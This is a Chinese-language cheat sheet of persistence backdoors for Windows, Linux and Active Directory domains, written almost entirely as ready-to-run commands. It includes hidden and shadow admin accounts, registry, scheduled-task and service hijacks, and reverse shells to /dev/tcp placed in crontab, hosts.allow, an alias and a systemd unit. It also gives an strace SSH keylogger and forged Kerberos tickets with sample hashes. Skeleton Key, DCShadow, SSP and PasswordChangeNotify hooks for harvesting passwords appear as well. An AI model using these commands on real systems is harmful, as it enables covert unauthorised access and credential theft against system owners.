# Persistence

A backdoor is a romance of technology—the tension between hidden wisdom, creation, and destruction laid bare.

<br>

后门是一种技术上的浪漫，隐秘的智慧、创造与破坏的张力，淋漓尽致。

[TOC]

## windows权限维持 10种

#### 粘滞键后门(绕过TrustedInstaller权限,映像劫持:注册表实现)

```
reg add "hklm\software\microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "debugger" /t "REG_SZ" /d "c:\windows\system32\cmd.exe" #这里的sethc.exe可以替换为其他程序
```

#### 注册表后门和系统启动项后门

###### 注册表后门(写入一组键值)

```
reg add hklm\... /v "begin" /t REG_SZ /d "c:\windows\...\...exe"

HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Runonce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Runonce
HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Runonce
```

###### 系统启动项(将应用程序放入文件夹中)

```
%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
%programdata%\Microsoft\Windows\Start Menu\Programs\StartUp
```

#### 计划任务后门

```
schtasks /create /tn "start_hm" /tr "C:\x.bat" /sc onstart /ru system /f #开机启动

schtasks /create /tn "start_login" /tr "c:\shell.exe" /sc onlogon /ru win2016 /f #登录时启动

schtasks /create /tn "run_hm" /tr "C:\Windows\System32\notepad.exe" /sc MINUTE /mo 1 /ru SYSTEM /f #创建成功后每分钟执行一次notepad.exe命令
```

#### 服务后门

```
sc create backdoor binpath= "c:\windows\system32\cmd.exe /c start c:\shell.exe" start= auto #通过原生进程启动后门，防止中断
```

#### 隐藏账户

```
net user back$ 1qaz@WSX /add

net localgroup administrators back$ /add #加入administrators组，方便远程登录
```

#### 影子账户

```
net user backdoor$ 1qaz@WSX /add #添加隐藏账户
net localgroup administrators backdoor$ /add

reg query "hklm\sam\sam\domains\account\users" #查询账户对应文件
reg query "hklm\sam\sam\domains\account\users\names\backdoor$" /z #1005
printf "%x" 1005 #3ed

reg query "hklm\sam\sam\domains\account\users\000001F4" #获得administrator账户f值

reg add "hklm\sam\sam\domains\account\users\000003ED" /v F /t reg_binary /d 020001000000000015E28244FE6ACD0100000000000000006879C621AE76DC0100000000000000000000000000000000F401000001020000100000000000000000000100010000000000000000000000 /f #强制将隐藏账户f值替换为administrator账户f值

reg export "hklm\sam\sam\domains\account\users\names\backdoor$" c:\main\backdoor$.reg
reg export "hklm\sam\sam\domains\account\users\000003ED" c:\main\000003ED.reg #导出数据

net user backdoor$ /del #清除账户

reg import c:\main\backdoor$.reg #恢复数据，达到影子账户目的
reg import c:\main\000003ED.reg
```

#### Userinit(用户登录初始化)

```
reg add "hklm\software\microsoft\windows nt\currentversion\winlogon" /v "Userinit" /t reg_sz /d "C:\Windows\system32\userinit.exe,c:\windows\system32\cmd.exe" /f
```

#### logon script(优先av执行)

```
reg add "hkcu\Environment" /v "UserInitMprLogonScript" /t reg_sz /d "c:\windows\system32\cmd.exe" /f
```

#### 文件关联

```
assoc .txt #查看txt文件关联。相似的还有batfile,makefile,cplfile,cmdfile
reg query "hkcr\txtfile\shell\open\command" #查看默认启动键值（备份默认启动键值，方便恢复）

(echo @echo off & echo start notepad.exe %1 ^&^& start cmd.exe) > C:\Windows\Temp\start_service.bat #创建运行脚本

reg add "hkcr\txtfile\shell\open\command" /ve /t "reg_expand_sz" /d "C:\Windows\Temp\start_service.bat %1" /f #替换文件关联

#恢复文件关联
reg add "hkcr\txtfile\shell\open\command" /ve /t "reg_expand_sz" /d "%SystemRoot%\system32\NOTEPAD.EXE %1" /f
```

#### inf(重启生效)

```
reg add "hkcu\software\microsoft\IEAK\GroupPolicy\PendingGPOs" /f

reg add "hkcu\software\microsoft\IEAK\GroupPolicy\PendingGPOs" /v "Count" /t reg_dword /d "1" /f

reg add "hkcu\software\microsoft\IEAK\GroupPolicy\PendingGPOs" /v "Path1" /t reg_sz /d "c:\windows\temp\shell.inf" /f

reg add "hkcu\software\microsoft\IEAK\GroupPolicy\PendingGPOs" /v "section1" /t reg_sz /d "DefaultInstall" /f

(echo [Version] & echo Signature="$CHICAGO$" & echo AdvancedINF=2.5,"test" & echo [DefaultInstall] & echo RunPreSetupCommands=Command1 & echo [Command1] & echo C:\windows\system32\notepad.exe) > c:\windows\temp\shell.inf

#电脑重启生效一次，PendingGPOs会被系统删除，需要重新创建
```

## linux权限维持 12种

#### 启动项

```
/etc/profile #登录shell启动时
/etc/profile.d/*.sh #被/etc/profile调用时

/etc/bashrc #任何新的交互式 shell（包括登录和非登录）
/etc/bash.bashrc

~/.bash_profile #登录shell启动时
~/.profile #当.bash_profile不存在时

~/.bashrc #交互式非登录shell启动时

~/.bash_logout #登录shell退出时

执行顺序（系统级，用户级）
/etc/profile → /etc/profile.d/*.sh → /etc/bash.bashrc → ~/.bash_profile（或 ~/.profile）→ ~/.bashrc
```

#### sudo/suid

```
echo "Qsa3 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers #添加用户sudo权限

chmod u+s /usr/bin/bash #给/usr/bin/bash增加suid权限
```

#### crontab自动任务

```
echo '* * * * * root bash -c "bash -i &> /dev/tcp/192.168.10.132/443 0>&1"' >> /etc/crontab

#/etc/crontab[cron.d/cron.daily/cron.hourly/cron.monthly/cron.weekly]


echo '* * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.10.129/1234 0>&1"' | crontab -

#/var/spool/cron/crontabs / /var/spool/cron/
#var目录下属于特定用户的自动任务不能写执行者，即上文的root
#创建文件时只能用 crontab - 方式，后续可写入文件（有些发行版可以>创建文件）

crontab -r #删除当前用户的所有定时任务
crontab -l #查看当前用户的所有定时任务
```

#### SSH公钥免密

```
ssh-keygen -t rsa -f /tmp/id_rsa -N "" #无交互生成密钥

cp /tmp/id_rsa.pub ~/.ssh/authorized_keys
chmod +r id_rsa

ssh -i id_rsa xxxx@xxx.xxx.xxx.xxx #使用私钥登录
```

#### SSH软连接

```
ln -sf /usr/sbin/sshd /tmp/su ; /tmp/su -oPort=10022 #创造软链接开放ssh服务在10022端口
```

#### 后门用户

```
useradd -m qwe
echo "qwe:1qaz@WSX" | sudo chpasswd #无声设置用户密码
sudo usermod -aG sudo qwe #将用户加入sudo组（便于ssh登录）

#sudo gpasswd -d qwe sudo #将用户移除sudo组
```

#### 超级账户

```
useradd -o -u 0 root_sham

echo "root_sham:1qaz@WSX" | chpasswd
```

#### alias后门

```
alias ls='alerts(){ls $* --color=auto;bash -c "bash -i >&/dev/tcp/127.0.0.1/1234 0>&1 &"};alerts 2>/dev/null'       $* 将所有参数返回给原命令 最后一个&作用是将任务放在后台执行， 2>/dev/null然后将错误不显示出来

#unalias ls #移除alias ls
```

#### Strace后门

```
strace -f -F -p $(ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}) -t -e trace=read,write -s 32 2> /tmp/.sshd.log &   #监控键盘记录ssh登录记录

cat /tmp/.sshd.log | grep -oP '"\\(10|f)\\0\\0\\0\K[^"]+(?=")' #查看键盘记录
```

#### SSH Wrapper后门(包装器后门，冒充服务后门，是一种思想，偷天换日思想) (实验：可能会导致服务无法正常启动）

```
mv /usr/sbin/sshd /usr/sbin/sshd_real #这里使用sshd举例

touch /usr/sbin/sshd

touch -r /usr/sbin/sshd_real /usr/sbin/sshd

echo 'exec /usr/sbin/sshd_real "$@"' >> /usr/sbin/sshd  #新脚本运行完，指向真正的sshd脚本，服务器重启之后会执行
```

#### TCP Wrapper后门

```
echo 'ALL: ALL: spawn (bash -c "/bin/bash -i >& /dev/tcp/192.168.10.129/8888 0>&1") & :allow' >> /etc/hosts.allow

#/etc/hosts.allow 允许所有的连接，并且当连接出现时，启动bash进行反弹连接。

ssh xxx@xxx.xxx.xxx.xxx #这里的xxx.xxx.xxx.xxx为靶机ip
```

#### systemd服务后门

```
/etc/systemd/system/backdoor.service

-----------------------------------------------------------

[Unit]
Description=Very important backdoor.
After=network.target
[Service]
Type=forking
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxx 0>&1"
ExecReload=
ExecStop=
PrivateTmp=true
[Install]
WantedBy=multi-user.target
-----------------------------------------------------------

chmod +x /etc/systemd/system/backdoor.service
systemctl daemon-reload #加载服务
systemctl enable backdoor #设置开机启动
systemctl start backdoor #启动服务
```

## windows域权限维持 12种

#### fake Ticket

###### golden ticket

```
impacket-ticketer administrator -dc-ip 192.168.10.5 -nthash 036753a940934248720ffda026797b59 -domain one.com -domain-sid S-1-5-21-365535506-3472225606-1523363171 #krbtgt_nthash
```

###### Silver Ticket

```
impacket-ticketer administrator -spn cifs/DC.one.com -dc-ip 192.168.10.5 -nthash a3b9a052ee7bc4a91b19b2ed041de15d -domain one.com -domain-sid S-1-5-21-365535506-3472225606-1523363171 #DC$_nthash
```

###### Diamond Ticket(实验)

```
impacket-ticketer administrator -request -user administrator -password 1qaz@WSX -nthash 161cff084477fe596a5db81874498a24 -dc-ip 192.168.10.5 -aesKey 4dd28b9244b1410cabc21f8707f41e88b7303ab000749b03df6dd5ed41138151 -domain one.com -domain-sid S-1-5-21-365535506-3472225606-1523363171 #administrator_nthash,krbtgt_aesKey
```

###### Sapphire Ticket(实验)

```
impacket-ticketer administrator -impersonate administrator -request -user administrator -password 1qaz@WSX -nthash 161cff084477fe596a5db81874498a24 -dc-ip 192.168.10.5 -aesKey 4dd28b9244b1410cabc21f8707f41e88b7303ab000749b03df6dd5ed41138151 -domain one.com -domain-sid S-1-5-21-365535506-3472225606-1523363171 #administrator_nthash,krbtgt_aesKey
```

#### SID_history后门

```
net user back$ 1qaz@WSX /add #添加隐藏账户

privilege::debug

sid::patch

sid::add /sam:back$ /new:administrator #将Administrator的sid赋值给back$的sid_history
```

#### DSRM后门

```
ntdsutil
set dsrm password
sync from domain account krbtgt #修改DSRM密码为krbtgt密码
q
q

reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f #开启dsrm可登录

privilege::debug
lsadump::lsa /patch /name:krbtgt #查看krbtgt_hash

token::elevate #提升令牌权限
lsadump::sam  #查看dsrm_nthash验证是否成功修改

#利用
impacket-psexec DC/administrator@192.168.10.5 -hashes :43cb1c8744ef1224eff6b3b403c60b62 #域控的名字，krbtgt的hash

sekurlsa::pth /domain:DC /user:Administrator /ntlm:43cb1c8744ef1224eff6b3b403c60b62 #域控的名字，krbtgt的hash(会弹窗)
```

#### Skeleton Key

```
1 .无lsa保护策略
privilege::debug
misc::skeleton



2.#lsa保护策略绕过
reg delete "hklm\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL #关闭 LSA 保护策略

privilege::debug
misc::skeleton

#开启 LSA 保护策略
[reg add "hklm\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f]



3 .lsa保护策略绕过(需要mimidrv.sys放在同目录)
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton

#利用
net use \\DC\ipc$ "mimikatz" /user:one\administrator #建立管道 条件：域成员机器，域用户(普通权限即可)

psexec.exe \\DC cmd.exe #microsoft pstools.psexec工具
```

#### Shadow Credential*

```
#要求
域控制器版本在Windows Server 2016+
域控制器上安装Active Directory证书服务(AD CS)
需要对目标用户msDS-KeyCredientialLink属性可写

certipy-ad shadow auto -account win2016 -u Administrator@one.com -p '1qaz@WSX' -dc-ip 192.168.10.5 -target DC.one.com
```

#### adminSDHolder

```
powershell -ep bypass ". .\PowerView.ps1 ; Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=two,DC=com" -PrincipalIdentity win2019 -Rights All -Verbose" #给win2019用户添加对adminSDHolder的权限

powershell -ep bypass ". .\Invoke-ADSDPropagation.ps1 ; Invoke-ADSDPropagation -TaskName runProtectAdminGroupsTask" #强制SDProp进程立刻执行

net group "Domain Admins" win2019 /add /domain #验证
```

#### DCshadow(要在另一台域主机上使用)

```
PsExec64.exe -i -s cmd.exe #system权限

net user hack 1qaz@WSX /add /domain

token::whoami #system

lsadump::dcshadow /object:CN=hack,CN=Users,DC=two,DC=com /attribute:primarygroupid /value:512 #监听等待触发，修改hack的primarygroupid的值为512,即将hack加入Domain Admins



PsExec64.exe -u two\administrator cmd #two\administrator权限

token::whoami #two\administrator

lsadump::dcshadow /push #触发监听
```

#### 伪造域控

```
impacket-addcomputer -computer-name 'machine' -computer-pass 'root' -dc-ip 192.168.12.5 'two.com/win2019:root' -method SAMR -debug #添加机器用户machine$，密码root

powershell $ADComputer = Get-ADComputer -Identity machine ; Set-ADObject -Identity $ADComputer -Replace @{userAccountControl=8192} #将userAccountControl更改为8192

net group "domain controllers" /domain #查询machine是否已经位于domain controllers组中

impacket-secretsdump two/machine$:root@192.168.12.5
```

#### 委派

```
#基于资源的约束性委派
net user john 1qaz@WSX /add /domain #增加一个域账户
setspn -A xxx/DC.two.com:5555 john #给域账户注册服务，使其成为服务账户

powershell Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount john #配置john到krbtgt的基于资源的约束性委派

powershell Get-ADUser krbtgt -Properties "PrincipalsAllowedToDelegateToAccount" #查询krbtgt的委派属性


#利用
impacket-getST -dc-ip 192.168.12.5 -spn krbtgt -impersonate administrator two.com/john:1qaz@WSX
export KRB5CCNAME=administrator@krbtgt_TWO.COM@TWO.COM.ccache
impacket-smbexec -dc-ip 192.168.12.5 DC.two.com -no-pass -k
```

#### ACL滥用

```
Rights : fullcontrol(GenericAll)(用有对某个账户的所有权限)
Rights : resetpassword(User-Force-Change-Password)(拥有某个账户的重置密码权限)
Rights : writemembers(member)(拥有某个组的添加/移除用户权限)
Rights : dcsync(DCSync)(拥有对某个域控的hash导出权限)

Add-DomainObjectAcl -TargetIdentity 'DC=two,DC=com' -PrincipalIdentity john -Rights DCSync #添加john对DC域的dcsync权限
```

#### SSP后门

###### 内存持久化法(半持久,关机失效)  #win2012-R2可用，winserver2016+失效

```
privilege::debug

misc::memssp

type C:\Windows\System32\mimilsa.log
```

###### dll持久化法

```
copy mimilib.dll c:\windows\system32\mimilib.dll

reg query "hklm\system\currentcontrolset\control\lsa" /v "security packages" #查看原数据

reg add "hklm\system\currentcontrolset\lsa" /v "security packages" /t reg_multi_sz /d "kerberosmsv1_0\0...\0mimilib" /f #数据使用\0隔开

type c:\windows\system32\kiwissp.log
```

#### Hook PasswordChangeNotify #2012-R2-可用，2016+失效

```
powershell -ep bypass ". .\Invoke-ReflectivePEInjection.ps1 ; Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass" #注入lsass进程

type c:\windows\temp\passwords.txt
```

# TOOLS_LINK

```
metasploit:
https://metasploit.com

impacket:
https://github.com/fortra/impacket/tree/master/examples

mimikatz:
https://github.com/gentilkiwi/mimikatz

certipy-ad:
https://github.com/ly4k/Certipy

powerview:
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

powerview-python:
https://github.com/aniqfakhrul/powerview.py

pstools:
https://learn.microsoft.com/fil-ph/sysinternals/downloads/pstools

Invoke-ADSDPropagation.ps1:
https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1

HookPasswordChange.dll && Invoke-ReflectivePEInjection.ps1:
https://github.com/Al1ex/Hook-PasswordChangeNotify
```
